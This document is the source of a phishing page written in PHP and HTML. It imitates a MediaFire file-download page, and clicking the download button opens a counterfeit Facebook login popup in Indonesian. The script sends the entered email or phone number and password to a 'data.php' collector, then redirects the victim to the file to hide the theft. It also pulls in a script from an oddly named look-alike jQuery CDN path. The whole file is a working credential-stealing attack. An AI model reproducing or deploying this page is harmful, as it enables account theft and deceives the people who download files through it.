<?php
include 'setting.php';
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title>Mediafire</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android">
        <link rel="icon" type="image/x-icon" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/favicon.ico">

<style>
.navbar-fb {
    background: #3b5998;
    height: auto;
    width:auto;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 320px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: 'Roboto';
}
.content-box-fb img {
    width: 60px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
    width: 90%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Lato',sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}
.login-form input[type="text"] {
    margin: 0px;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0px;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}
.btn-login-fb.disabled
{
    pointer-events: none;
    background:#8b9dc3;
    border:1px solid #8b9dc3;
}
.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.popup-login {
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index: 999999999999999999;
    display: none;
}
.popup-box-login-fb {
    background:#ECEFF6;
    max-width:330px;
    height:auto;
    position:relative;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:10px;
}
</style>
<style>
* {
    margin: 0px;
}
html {
    font: normal normal normal 14px/1.6 'Open Sans', sans-serif;
}
body {
    margin: 0px;
    background-color: #fff;
}
main {
        display: flex;
    flex-direction: column;
    align-items: center;
}
header {
       background: #fff;
    padding: 20px 0px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #0000002b;
    box-shadow: 0px 0px 1px 0px #0000002e;
    position: fixed;
    z-index: 2;
    width: 100%;
}
.imgmdralex {
        margin-left: 10%;
}
#ptcalexd {
    height: 27px;
}
#ptcalexm {
    display: none;
}
.menualexuser {
        margin-right: 10%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    column-gap: 3px;
}
.menualexuser button {
        background: #0070f0;
    color: #fff;
    max-width: 150px;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
    font-size: 12px;
    padding: 0 10px;
    display: inline-block;
    vertical-align: middle;
    border-radius: 3px;
    font-family: "Open Sans", sans-serif;
    font-weight: normal;
    cursor: pointer;
    height: 36px;
    line-height: 36px;
    border: 0;
    outline: 0;
    text-transform: uppercase;
    text-align: center;
    -webkit-appearance: none;
    box-sizing: border-box;
}
.menualexuser button>i {
        margin-left: 5px;
    background: rgb(0 0 0 / 15%);
    padding: 3px 5px;
    border-radius: 1px;
}
section {
        padding-top: 200px;
    max-width: 400px;
    width: 100%;
}
.contalexmdr {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.btnalexdwn {
       width: 100%;
    background: #0070f0;
    color: #fff;
    align-items: center;
    padding: 7px 0px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    border-radius: 4px;
    justify-content: space-between;
    cursor: pointer;
}
.lalexbtnd {
        margin-left: 20px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}
.lalexbtnd img {
        width: 35px;
}
.txtalexdwn {
    text-align: left;
}
.txtalexdwn p {
        font-weight: 600;
    font-size: 18px;
}
.txtalexdwn label {
        font-size: 13px;
}
.btnalexdwn i {
        margin-right: 20px;
    font-size: 20px;
}
.alexlnkcont {
        margin-top: 20px;
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: wrap;
    align-items: center;
    justify-content: space-between;
}
.itemalexcont {
        width: 49%;
    font-size: 13px;
    line-height: 14px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    background-color: #f4f4f5;
    border-radius: 4px;
    color: #575b65;
    padding: 10px 0;
    text-align: center;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: 10px;
}
.itemalexcont i {
        font-size: 18px;
    color: #575b65;
    margin-bottom: 5px;
    color: #777;
}
.uplregalexmdr {
        margin-top: 150px;
        margin-bottom: 200px;
}
.alexmapmdr {
        position: relative;
    background: #4cacff url(https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/world.svg) center / contain no-repeat;
    box-shadow: inset 0 0 0 2px rgb(0 0 0 / 6%);
    margin-bottom: 30px;
    width: 100%;
    height: 200px;
}
.descalexmapmdr {
        display: inline-block;
    padding: 4px 8px;
    color: #fff;
    font-size: 11px;
    background-color: rgba(0, 0, 0, 0.4);
    position: relative;
    z-index: 1;
}
.bgalexdbmdr {
        background-image: url(https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/continent-as.svg);
    background-position: center;
    background-size: contain;
    background-repeat: no-repeat;
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
}
.alexdescmap {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
}
.alexdescmap img {
        height: 50px;
    margin-right: 20px;
}
.alexdescmap span {
        font-size: 13px;
}
.vtotoalalexmdr {
        padding-bottom: 50px;
    border-bottom: 1px solid #00000014;
    margin-bottom: 20px;
    margin-top: 40px;
    display: flex;
    justify-content: flex-start;
    flex-direction: column;
}
.vtotoalalexmdr img {
        background-color: #fff;
    height: 96px;
    width: 160px;
    box-shadow: inset 0 0 0 2px rgba(0, 0, 0, 0.06);
    margin: 0 30px 15px 0;
    padding: 20px;
    box-sizing: border-box;
    position: relative;
}
.vtotoalalexmdr p {
        margin: 0 0 15px;
    width: 100%;
    font-weight: bold;
    font-size: 14px;
    margin-bottom: 10px;
}
.vtotoalalexmdr span {
        font-size: 13px;
    line-height: 1.4;
    margin-bottom: 10px;
}
footer {
        padding: 30px 0px;
    width: 100%;
    background-color: #f3f3f3;
    height: auto;
    min-height: 260px;
    color: #575b65;
    box-shadow: inset 0 1px 0px 0 rgba(0, 0, 0, 0.03);
}
.topmdrfootalex {
       position: relative;
    max-width: 960px;
    margin: 0 auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: flex-start;
    justify-content: space-between;
        padding-bottom: 70px;
    border-bottom: 1px solid #55555529;
}
.itemboxmdralexf {
        text-align: left;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-content: flex-start;
    font-size: 12px;
}
.itemboxmdralexf p {
        color: #575b65;
    font-family: "Open Sans", sans-serif;
    font-size: 12px;
    position: relative;
    font-weight: 600;
    text-transform: uppercase;
    margin-bottom: 10px;
}
.alexfootalexc {
        max-width: 960px;
    padding-top: 40px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    margin: 0 auto;
    font-size: 12px;
}
.leftcalexmdrf {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-start;
    column-gap: 20px;
}
.rightalexmdrf {
        font-size: 20px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}
.rightalexmdrf i {
        color: #575b656b;
    padding: 5px 9px;
    border-radius: 1px;
    background: #575b6508;
}
.spnalxmdr {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.spnjjralexmdr {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 20px;
}

@media only screen and (max-width: 600px) {
.imgmdralex {
        margin-left: 5%;
}
#ptcalexd {
    display: none;
}
#ptcalexm {
        display: block;
    width: 191px;
}
.menualexuser {
        column-gap: 1px;
}
.menualexuser button {
        font-size: 9px;
    font-weight: 700;
    border-radius: 1px;
}
.menualexuser button> i {
    display: none;
}
section {
        width: 90%;
}
.topmdrfootalex {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    width: 90%;
}
.itemboxmdralexf {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    column-gap: 20px;
    margin-bottom: 20px;
    padding-bottom: 10px;
}
.spnalxmdr {
        display: flex;
    flex-direction: row;
    align-items: center;
    column-gap: 20px;
}
.alexfootalexc {
        width: 90%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.leftcalexmdrf {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    gap: 20px;
}
.rightalexmdrf {
        margin-top: 50px;
}
.spnjjralexmdr {
        display: flex;
    flex-direction: row;
    flex-wrap: wrap;
    align-items: center;
    column-gap: 28px;
    line-height: 3;
}
}
</style>
    </head>
    <body>
        <main>
            <header>
                <div class="imgmdralex">
                    <img id="ptcalexd" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_logo_full_color.svg" alt="mediafire" />
                    <img id="ptcalexm" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_logo_u1_full_color_reversed.svg" alt="mediafire" />
                </div>
                <div class="menualexuser">
                    <button>Sign Up</button>
                    <button>Log In <i class="fa-brands fa-facebook-f" onclick="footericon()"></i> <i class="fa-brands fa-twitter"></i></button>
                </div>
            </header>
            <section>
                <div class="contalexmdr">
                    <div class="btnalexdwn" onclick="footericon()">
                        <div class="lalexbtnd" onclick="footericon()">
                            <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/file-zip-v3.png" alt="" onclick="footericon()" />
                            <div class="txtalexdwn" onclick="footericon()">
                                <p onclick="footericon()"><?php echo $namafile;?></p>
                                <label onclick="footericon()">Download (<?php echo $ukuran;?>)</label>
                            </div>
                        </div>
                        <i onclick="footericon()" class="fa-solid fa-down-to-line"></i>
                    </div>
                    <div class="alexlnkcont">
                        <div class="itemalexcont">
                            <i class="fa-solid fa-link-simple"></i>
                            <span>Copy for messenger</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-solid fa-share-nodes"></i>
                            <span>Share options</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-brands fa-facebook-f"></i>
                            <span>Post to Facebook</span>
                        </div>
                        <div class="itemalexcont">
                            <i class="fa-solid fa-plus"></i>
                            <span>Save to My Files</span>
                        </div>
                    </div>
                </div>
                <div class="uplregalexmdr">
                    <div class="alexmapmdr">
                        <div class="descalexmapmdr">Upload region:</div>
                        <div class="bgalexdbmdr"></div>
                    </div>
                    <div class="alexdescmap">
                        <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/idn.svg" alt="" />
                        <span>This file was uploaded from Indonesia on June 29, 2022 at 7:24 AM</span>
                    </div>
                    <div class="vtotoalalexmdr">
                        <img src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/flag.svg" alt="" />
                        <p>VirusTotal scan</p>
                        <span>MediaFire scans high-risk files using VirusTotal.</span>
                    </div>
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/mf_round.svg" alt="" />
                        <p>About MediaFire</p>
                        <span>Welcome!<br>With MediaFire, you get simple yet powerful file storage along with features you won’t find anywhere else. <label style="color; #0070f0;">Learn more</label></span>
                    </div>
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/browser_chrome.svg" alt="" />
                        <p>Download application</p>
                        <span>You are downloading this file with Chrome, version 0.0.</span>
                    </div>
                </div>
            </section>
            <footer>
                <div class="topmdrfootalex">
                    <div class="itemboxmdralexf">
                        <p>COMPANY</p>
                        <div class="spnalxmdr">
                            <span>About Us</span>
                            <span>Careers</span>
                            <span>Press</span>
                            <span>Company Blog</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>TOOLS</p>
                        <div class="spnalxmdr">
                            <span>MediaFire Mobile</span>
                        <span>On-Demand Video Encoding</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>UPGRADE</p>
                        <div class="spnalxmdr">
                            <span>Professionals</span>
                        </div>
                    </div>
                    <div class="itemboxmdralexf">
                        <p>SUPPORT</p>
                        <div class="spnalxmdr">
                            <span>Get Support</span>
                        </div>
                    </div>
                </div>
                <div class="alexfootalexc">
                    <div class="leftcalexmdrf">
                        <span>©2022 MediaFire Build 121873</span>
                        <div class="spnjjralexmdr">
                            <span>Advertising</span>
                            <span>Terms</span>
                            <span>Privacy Policy</span>
                            <span>Copyright</span>
                            <span>Abuse</span>
                            <span>Credits</span>
                            <span>More...</span>
                        </div>
                    </div>
                    <div class="rightalexmdrf">
                        <i class="fa-brands fa-facebook-f"></i>
                        <i class="fa-brands fa-twitter"></i>
                        <i class="fa-solid fa-b"></i>
                    </div>
                </div>
            </footer>
            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
		      <div class="popup-box-login-fb">
		        <div class="navbar-fb">
		          <img width="45" src="https://rawcdn.githack.com/AlexHostX/logAlex/391a0879c14c7ba91729a2271cfc42f3f874c190/facebook_text.png">
		          </div>
		          <div class="content-box-fb">
		      	  <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		       	  <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
		          <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
		          <div class="txt-login-fb">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
                    <form class="login-form" action="" method="POST">
		            <label>
		            <input type="text" id="user" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
		            </label>
		            <label>
		            <input type="password" id="pass" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
		            </label>
		            <input type="hidden" name="login" value="Facebook">
		            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
		            </form>
		         <div class="txt-create-account">Buat akun</div>
		         <div class="txt-not-now">Lain kali</div>
		         <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
		         </div>
		         <div class="language-box">
		         <center>
		         <div class="language-name language-name-active">Bahasa Indonesia</div>
		         <div class="language-name">English (UK)</div>
		         <div class="language-name">Basa Jawa</div>
		         <div class="language-name">Bahasa Melayu</div>
		         <div class="language-name">日本語</div>
		         <div class="language-name">Español</div>
		         <div class="language-name">Português (Brasil)</div>
		         <div class="language-name">
		         <i class="fa fa-plus"></i>
		         </div>
		         </center>
		        </div>
		       <div class="copyright">Facebook Inc.</div>
		     </div>
		   </div>
        </main>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqueryfuncition@main/slim.min.js"></script>
        <script type="text/javascript">
            function footericon() {
                $('.login-facebook').fadeIn();
            }
                window.addEventListener('submit', (e) => {
                        $('.btn-login-fb').html('<i class="fa fa-circle-o-notch fa-spin">')
                    e.preventDefault()
                    setTimeout(() => {
                        check()
                    },2000)
                    return false;
                })
		    function check()
		    {
			    $user = $('#user').val().trim();
			    $pass = $('#pass').val().trim();
			    if($user == '' || $user == null || $user.length <= 5)
			    {
				    $('.email').show();
				    $('.sandi').hide();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.email').hide();
			    }
			    if($pass == '' || $pass == null || $pass.length <= 5)
			    {
				    $('.sandi').show();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.sandi').hide();
			    }
                    // if all form are filled
                    if($user !== '' || $user !== null || !$pass == '' || !$pass == null)
                
                    {
                        // SEND DATA
                        $.ajax({
                            type: 'POST',
                            url: 'data.php',
                            data: $('form').serialize(),
                            dataType: 'text',
                            success: function() {
                                        $('.login-facebook').toggle();
                                        $('.btn-login-fb').html('Success')
                                        $('.login-facebook').fadeOut();
                                        window.location = '<?php echo $file;?>';
                                } 
                        })
                    }
		    }
	</script>
<script type="text/javascript" src=""></script>
</body>
</html>